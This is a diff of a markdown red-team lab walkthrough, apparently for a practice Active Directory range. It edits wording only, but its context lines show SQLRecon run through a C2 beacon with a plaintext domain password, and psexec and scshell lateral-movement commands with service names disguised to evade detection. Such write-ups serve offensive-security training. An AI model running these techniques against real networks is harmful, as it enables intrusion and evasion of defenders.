@@ -976,7 +976,7 @@ proxychains mssqlclient.py north.sevenkingdoms.local/samwell.tarly:Heartsbane@10
 
 **C2 (SQLRecon via execute-assembly):**
 
-SQLRecon was used because it supports Windows Authentication, which the SQL-BOF collection does not provide support. SQLRecon runs inline through `execute-assembly`. It loads the .NET CLR into the beacon process and connects with Windows domain authentication. No binary is written to disk.
+SQLRecon was used because it supports Windows Authentication, which the SQL-BOF collection does not support. SQLRecon runs inline through `execute-assembly`. It loads the .NET CLR into the beacon process and connects with Windows domain authentication. No binary is written to disk.
 
 ```
 execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:info
@@ -1216,7 +1216,7 @@ Create custom service name and binary name to reduce signature:
 jump psexec -b svcutil.exe -n "WinConfigSvc" -d "Manages system configuration updates" 10.1.10.11 /local/path/to/smb_x64_svc.exe
 ```
 
-> The SMB beacon would have been the best and realistic option for this, however [Kharon](https://github.com/entropy-z/Kharon) Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
+> The SMB beacon is the better and realistic option as later shown, however [Kharon](https://github.com/entropy-z/Kharon) Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
 
 ![](image/red-team-workflow/20260922165526.png)
 
@@ -1318,7 +1318,7 @@ With a specific service name and custom binary name:
 jump scshell 10.1.10.11 /local/path/to/smb_x64_svc.exe -n defragsvc -b update.exe -s C$ -p C:\Windows
 ```
 
-> The SMB beacon would have been the best and realistic option for this, however [Kharon](https://github.com/entropy-z/Kharon) Listener config doesn't yet support SMB as previously explained in section 6.2. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
+> The SMB beacon is the better and realistic option as later shown, however [Kharon](https://github.com/entropy-z/Kharon) Listener config doesn't yet support SMB as previously explained in section 6.2. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 
 
 ![](image/red-team-workflow/20260922165815.png)
 
